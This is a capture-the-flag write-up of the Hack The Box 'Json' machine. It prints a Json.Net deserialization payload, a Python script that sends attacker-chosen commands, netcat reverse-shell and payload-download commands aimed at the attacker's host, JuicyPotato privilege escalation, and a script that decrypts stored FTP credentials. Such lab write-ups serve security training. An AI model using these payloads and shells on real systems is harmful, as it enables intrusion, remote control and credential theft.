I"Òq<h1 id="medium-json-">[MEDIUM] Json <br /></h1>

<p><img src="/writeups/htb/boxes/images/json_1.png# icon" alt="Json icon" /></p>

<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">NMAP</h3>

<p>We have our nmap scan run the following:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-v</span> 10.10.10.158 <span class="nt">-p</span> 1-10000

</code></pre></div></div>

<p>Then here is the result:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host is up <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 9976 closed ports
PORT     STATE    SERVICE       VERSION
21/tcp   open     ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open     http          Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Json HTB
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1894/tcp filtered o2server-port
2465/tcp filtered lbm
2608/tcp filtered wag-service
2923/tcp filtered wta-wsp-wtp-s
3228/tcp filtered dwmsgserver
3942/tcp filtered srdp
4110/tcp filtered g2tag
4939/tcp filtered unknown
5636/tcp filtered sfm-db-server
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6175/tcp filtered unknown
6822/tcp filtered unknown
6966/tcp filtered swispol
7271/tcp filtered unknown
8079/tcp filtered unknown
8225/tcp filtered unknown
8291/tcp filtered unknown
8337/tcp filtered unknown
9310/tcp filtered unknown
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
TCP/IP fingerprint:
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>2/15%OT<span class="o">=</span>21%CT<span class="o">=</span>1%CU<span class="o">=</span>36910%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>5E477E0
OS:E%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>I%CI<span class="o">=</span>I%II<span class="o">=</span>I%SS<span class="o">=</span>S%TS<span class="o">=</span>
OS:7<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>109%TS<span class="o">=</span>7<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DNW8ST11%O2<span class="o">=</span>M54DNW8ST11%O3<span class="o">=</span>M54
OS:DNW8NNT11%O4<span class="o">=</span>M54DNW8ST11%O5<span class="o">=</span>M54DNW8ST11%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>2000%W2<span class="o">=</span>2000%
OS:W3<span class="o">=</span>2000%W4<span class="o">=</span>2000%W5<span class="o">=</span>2000%W6<span class="o">=</span>2000<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>2000%O<span class="o">=</span>M54DNW8NNS%CC
OS:<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>
OS:S%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>O%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF
OS:<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>
OS:%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>O%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>80%W<span class="o">=</span>
OS:0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>80%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RI
OS:PCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>80%CD<span class="o">=</span>Z<span class="o">)</span>

Uptime guess: 0.001 days <span class="o">(</span>since Sat Feb 15 00:11:51 2020<span class="o">)</span>
Network Distance: 2 hops
TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>261 <span class="o">(</span>Good luck!<span class="o">)</span>
IP ID Sequence Generation: Busy server or unknown class
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h11m00s, deviation: 0s, median: 4h11m00s
| nbstat: NetBIOS name: JSON, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:cc:4d <span class="o">(</span>VMware<span class="o">)</span>
| Names:
|   JSON&lt;00&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|_  JSON&lt;20&gt;             Flags: &lt;unique&gt;&lt;active&gt;
|_smb-os-discovery: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-02-15T09:24:44
|_  start_date: 2020-02-15T09:23:08

TRACEROUTE <span class="o">(</span>using port 23/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   328.88 ms 10.10.14.1
2   332.69 ms 10.10.10.158

NSE: Script Post-scanning.
Initiating NSE at 00:13
Completed NSE at 00:13, 0.00s elapsed
Initiating NSE at 00:13
Completed NSE at 00:13, 0.00s elapsed
Initiating NSE at 00:13
Completed NSE at 00:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>417.37 seconds
           Raw packets sent: 13749 <span class="o">(</span>609.592KB<span class="o">)</span> | Rcvd: 12330 <span class="o">(</span>696.519KB<span class="o">)</span>

</code></pre></div></div>

<p>Important services:<br />
FTP - port 21
HTTP - port 80
RPC - port 135
Netbios-ssn - port 139
SMB - port 445
HTTP (Winrm service) - port 5985 
<br /></p>

<h2 style="font-size: 1.2em">FTP Anonymous Login</h2>
<p><br /></p>

<p>Checking FTP if we can login as anonymous user:</p>

<p><img src="/writeups/htb/boxes/images/json_4.png" alt="4" /></p>

<p>We can‚Äôt login as anonymous
<br /></p>

<h2 style="font-size: 1.2em">Web Service Enumeration</h2>
<p><br /></p>

<p>Checking the page served at port 80:
<img src="/writeups/htb/boxes/images/json_5.png" alt="5" /></p>

<p><br />
Quick check for ‚Äúadmin‚Äù/‚Äùadmin‚Äù username/password to see if it works.</p>

<p><img src="/writeups/htb/boxes/images/json_6.png" alt="6" />
It worked as it opens up a dashboard. However, upon further inspection of the links on the dashboard, most of it are dead. 
<br /></p>

<p>Checking the page source, we can see there is a javascript file called <code class="highlighter-rouge">app.min.js</code>. Below are also its contents</p>

<p><img src="/writeups/htb/boxes/images/json_7.png# medium" alt="7" /></p>

<p><br /></p>

<p>And here is its content:
<img src="/writeups/htb/boxes/images/json_8.png" alt="8" />
Since it‚Äôs hard to read it this way, we can fix this by feeding it to a javascript code beautifier.
<img src="/writeups/htb/boxes/images/json_9.png" alt="9" /></p>

<p>There are two links we can see:</p>
<ul>
  <li><code class="highlighter-rouge">/api/token</code> at line 15</li>
  <li><code class="highlighter-rouge">/api/Account</code> at line 26</li>
</ul>

<p><br /></p>

<p>The <code class="highlighter-rouge">/api/token</code> accepts <code class="highlighter-rouge">POST</code> requests with data parameters <code class="highlighter-rouge">UserName</code> and <code class="highlighter-rouge">Password</code> while <code class="highlighter-rouge">/api/Account</code> accepts <code class="highlighter-rouge">GET</code> requests whereas it has additional header called <code class="highlighter-rouge">Bearer</code> (decoded bytecode from line 28).</p>

<p><br />
Accessing those links with curl will give these results:</p>
<ul>
  <li>Result at <code class="highlighter-rouge">/api/token</code> curl
<img src="/writeups/htb/boxes/images/json_10.png" alt="10" />
will set a cookie which is a base64 JSON of user info
<img src="/writeups/htb/boxes/images/json_11.png" alt="11" />
    <pre><code class="language-JSON">{"Id":1,"UserName":"admin","Password":"21232f297a57a5a743894a0e4a801fc3","Name":"User Admin HTB","Rol":"Administrator"}
</code></pre>
    <p><br />
There is nothing really new in there. Even the password hash is also just ‚Äúadmin‚Äù.
<img src="/writeups/htb/boxes/images/json_12.png#" alt="12" />
<br /></p>
  </li>
  <li>Result at <code class="highlighter-rouge">/api/Account</code> curl. Since the <code class="highlighter-rouge">Bearer</code> header is for authentication, we just set its value from the value of the cookie given by <code class="highlighter-rouge">/api/token</code>.
<img src="/writeups/htb/boxes/images/json_13.png#" alt="13" /></li>
</ul>

<p><br />
However, the result is also the JSON received earlier but only in decoded base64 form.
<img src="/writeups/htb/boxes/images/json_14.png#" alt="14" /></p>

<h2 style="font-size: 1.4em">Web Service Exploitation. (Deserialization Exploit)</h2>
<p><br />
However, a malformed json being sent to the server either via two of those links will return an error. 
<img src="/writeups/htb/boxes/images/json_15.png" alt="15" />
It means that the deserialization of the data is mishandled and can be a vulnerability. We can check this with a tool called <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>.
<br /></p>

<p>Running the .exe file in a windows machine:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.<span class="se">\y</span>soserial.net <span class="nt">-f</span> Json.Net <span class="nt">-g</span> ObjectDataProvider <span class="nt">-c</span> <span class="s2">"cmd /c ping 10.10.14.87"</span>

</code></pre></div></div>
<p>It will give this payload:</p>

<pre><code class="language-JSON">{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c ping 10.10.14.87']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
</code></pre>
<p><br /></p>
<h1 id="targeting--apitoken">Targeting : /api/token</h1>

<p>We setup an icmp sniffer:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpdump -i tun0 icmp
</code></pre></div></div>
<p>and then we attack. If our payload succeeds, our icmp sniffer should be accepting icmp packets.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.158/api/token <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">--data</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>payload.txt<span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>
<p>However, this attack only made the server return an error and the server did not execute the ping command.
<br /></p>
<h1 id="targeting--apiaccount">Targeting : /api/Account</h1>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.10.10.158/api/Account <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-H</span> <span class="s2">"Bearer: </span><span class="si">$(</span><span class="nb">cat </span>payload.txt | <span class="nb">base64</span> <span class="nt">-w</span> 0<span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>
<p>This attack made our ping command executed!</p>

<p><img src="/writeups/htb/boxes/images/json_16.png" alt="16" /></p>

<p>With this, I created a python script that inputs our command so our payload will be flexible.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">base64</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"payload_flex.txt"</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">rf</span><span class="p">:</span>

	<span class="n">contents</span> <span class="o">=</span> <span class="n">rf</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

<span class="c1">#token = base64.b64encode(contents).decode()
#print(tokena)
</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>

	<span class="n">useri</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Command: "</span><span class="p">)</span>
	<span class="n">useri</span> <span class="o">=</span> <span class="n">useri</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">","</span><span class="p">)</span>

	<span class="n">to_send</span> <span class="o">=</span> <span class="n">contents</span> <span class="o">%</span> <span class="p">(</span><span class="n">useri</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">useri</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
	<span class="n">to_send</span> <span class="o">=</span> <span class="n">to_send</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>	

	<span class="n">token</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">to_send</span><span class="p">)</span>
	<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

	<span class="k">print</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">token</span><span class="p">))</span>

	<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s">'Content-Type'</span> <span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span>
		<span class="s">'Application'</span> <span class="p">:</span> <span class="s">'application/json'</span><span class="p">,</span>
		<span class="s">'Bearer'</span> <span class="p">:</span> <span class="n">token</span>
	<span class="p">}</span>

	<span class="n">page</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://10.10.10.158/api/Account'</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">page</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

</code></pre></div></div>

<h1 id="spawning-a-shell">Spawning a Shell</h1>

<p>To spawn a shell wth this, we can upload netcat executable for windows then execute it also via the script with powershell or cmd execution.
<br />
Let‚Äôs first setup http server that contains the netcat executable. I used python3 http.server module. Execute the following.
<img src="/writeups/htb/boxes/images/json_17.png" alt="17" />
<br />
After the netcat is uploaded, execute the following:</p>
<pre><code class="language-Bash">Command: powershell.exe, /c c:\\Windows\\Temp\\nc.exe 10.10.14.87 4444 -e "cmd.exe'
</code></pre>
<h1 id="note">NOTE:</h1>
<p>If ‚Äúpowershell.exe‚Äù is used immediately, the server doesn‚Äôt spawn a shell.</p>

<p><br />
We successfuly spawned a shell with ‚Äúuserpool‚Äù as our user!</p>

<p><img src="/writeups/htb/boxes/images/json_18.png# big" alt="18" />
<br /></p>

<h1 id="user-flag">User Flag</h1>
<p>We can just go to <code class="highlighter-rouge">C:\Users\userpool\Desktop\</code> to get our user flag.</p>

<p><img src="/writeups/htb/boxes/images/json_19.png# big" alt="19" /></p>

<h2 style="font-size: 1.4em">Privilege Escalation</h2>
<p><br /></p>

<p>There are two ways of getting root:</p>

<h2 style="font-size: 1.3em">Method 1</h2>

<h2 style="font-size: 1.2em">Enumeration</h2>

<p>We can check the privileges of our user. It‚Äôs stated that SeImpersonatePrivilege is enabled thus we can use an exploit that uses this setting to escalate to NT AUTHORITY\SYSTEM</p>

<p><img src="/writeups/htb/boxes/images/json_20.png# big" alt="20" /></p>

<p>Windows 2019 and Windows 10 1809 are unaffected by this but the version of Windows of the server is of earlier version.</p>

<p><img src="/writeups/htb/boxes/images/json_21.png# big" alt="21" /></p>

<h2 style="font-size: 1.2em">JuicyPotato Exploitation</h2>
<p>We can use the <a href="https://github.com/ohpe/juicy-potato/">JuicyPotato exploit</a> to exploit this setting.<br /></p>

<p>It‚Äôs also needed that a correct CLSID is selected in order for this to work. The list of CLSID I used for this version of windows is <a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2012_Datacenter">here</a>
The CLSID I used is this:</p>

<p><img src="/writeups/htb/boxes/images/json_22.png# big" alt="22" />
<br /></p>

<p>By using the same exploit python script, upload the executable to the server.</p>

<pre><code class="language-Bash">Command: powershell.exe, /c invoke-webrequest http://10.10.14.87:8000/JuicyPotato.exe -outfile c:\\Windows\\Temp\\service.exe
</code></pre>
<p><br />
After uploading the executable, set up another netcat in the attacking machine and execute the following at the current shell in the server.</p>
<pre><code class="language-Bash">c:\Windows\Temp&gt;.\service.exe -l 3333 -p c:\Windows\System32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -a "/c c:\Windows\Temp\nc.exe 10.10.14.87 4445 -e cmd.exe"
</code></pre>
<p><br />
After the netcat receives the connection, we are connected as <code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code> on the server. We also should be able to get the root flag.</p>

<p><img src="/writeups/htb/boxes/images/json_23.png# big" alt="23" /></p>

<p><br /></p>

<h2 style="font-size: 1.3em">Method 2</h2>

<h2 style="font-size: 1.2em">Enumeration</h2>
<p>If we go to C:\Program Files, there is a folder called ‚ÄúSync2Ftp‚Äù and here is its contents:</p>

<p><img src="/writeups/htb/boxes/images/json_24.png# big" alt="24" />
<br />
After retrieving the two files, it can now be checked that the executable is .NET executable</p>

<p><img src="/writeups/htb/boxes/images/json_25.png# big" alt="25" /></p>

<p>while the config contains encrypted username, password, and a key.
<br /></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="nt">&lt;configuration&gt;</span>
  <span class="nt">&lt;appSettings&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"destinationFolder"</span> <span class="na">value=</span><span class="s">"ftp://localhost/"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"sourcefolder"</span> <span class="na">value=</span><span class="s">"C:\inetpub\wwwroot\jsonapp\Files"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"user"</span> <span class="na">value=</span><span class="s">"4as8gqENn26uTs9srvQLyg=="</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"minute"</span> <span class="na">value=</span><span class="s">"30"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">"oQ5iORgUrswNRsJKH9VaCw=="</span><span class="nt">&gt;&lt;/add&gt;</span>
    <span class="nt">&lt;add</span> <span class="na">key=</span><span class="s">"SecurityKey"</span> <span class="na">value=</span><span class="s">"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/appSettings&gt;</span>
  <span class="nt">&lt;startup&gt;</span>
    <span class="nt">&lt;supportedRuntime</span> <span class="na">version=</span><span class="s">"v4.0"</span> <span class="na">sku=</span><span class="s">".NETFramework,Version=v4.7.2"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/startup&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
</code></pre></div></div>
<p><br /></p>

<h2 style="font-size: 1.2em">Reversing the .NET executable</h2>
<p>To reverse or decompile the .NET executable, dotPeek is used. After reversing, there is a Encrypt() and Decrypt() function on the decompiled code.</p>

<p><img src="/writeups/htb/boxes/images/json_26.png" alt="26" />
Focusing on the Decrypt() function, it‚Äôs stated that it used 3DES-ECB as the encryption algorithm. A little problem is that it has <code class="highlighter-rouge">hashing</code> variable that decides whether or not to hash the key.</p>

<h2 style="font-size: 1.2em">Decrypting username and password</h2>
<p>Here‚Äôs the written python script to decrypt the username and password.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">DES3</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="n">username</span> <span class="o">=</span> <span class="s">"4as8gqENn26uTs9srvQLyg=="</span>
<span class="n">password</span> <span class="o">=</span> <span class="s">"oQ5iORgUrswNRsJKH9VaCw=="</span>
<span class="n">key</span> <span class="o">=</span> <span class="s">"_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU</span><span class="si">%</span><span class="s">"</span>

<span class="s">'''
Notice that key is not lenth 16 or 24, so
it needs to be hashed using MD5 hash algo.
It is also indicated in the reversed .NET exe
'''</span>

<span class="n">hh</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s">'md5'</span><span class="p">)</span>
<span class="n">hh</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
<span class="n">hashed_key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hh</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>

<span class="n">username</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>

<span class="n">des3_cipher</span> <span class="o">=</span> <span class="n">DES3</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">hashed_key</span><span class="p">,</span> <span class="n">DES3</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"[+] USER: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">des3_cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">username</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"[+] PASS: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">des3_cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">password</span><span class="p">)))</span>
</code></pre></div></div>
<p><br />
And the output of python script is:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] USER: b<span class="s1">'superadmin\x06\x06\x06\x06\x06\x06'</span>
<span class="o">[</span>+] PASS: b<span class="s1">'funnyhtb\x08\x08\x08\x08\x08\x08\x08\x08'</span>
<span class="c">########</span>
USER: superadmin
PASS: funnyhtb
</code></pre></div></div>
<p><br /></p>
<h2 style="font-size: 1.2em">FTP Login</h2>
<p>Since it is said to ‚ÄúSync‚Äù with FTP, use the credentials first to FTP.
<img src="/writeups/htb/boxes/images/json_27.png# big" alt="27" />
<br /></p>

<p>The credentials worked! Notice also that the root.txt can also be downloaded.
<img src="/writeups/htb/boxes/images/json_28.png" alt="28" /></p>

<p>However, the credentials might have worked for the FTP but it did not work on SMB or on Winrm so it‚Äôs hard to say if the credentials can help spawn a shell of SYSTEM user.
<br />
Thank you for reading.</p>

:ET